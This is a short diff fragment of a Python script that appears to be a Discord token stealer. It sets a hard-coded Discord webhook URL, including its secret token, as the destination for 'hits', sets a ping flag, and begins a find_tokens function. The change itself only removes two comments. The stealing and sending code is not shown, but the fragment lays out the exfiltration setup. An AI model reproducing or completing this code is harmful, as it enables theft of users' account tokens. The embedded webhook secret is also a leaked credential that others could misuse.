@@ -4,10 +4,10 @@ import json
 
 from urllib.request import Request, urlopen
 
-# your webhook URL
+
 WEBHOOK_URL = 'https://discordapp.com/api/webhooks/863488030295326760/yJIqa27_cdgHgeHb6hr5TZAT_TUfM7ybtt2C9tVWcaaRWk5ziTH1C5Jtg-Hk0tujWaj0'
 
-# mentions you when you get a hit
+
 PING_ME = False
 
 def find_tokens(path):
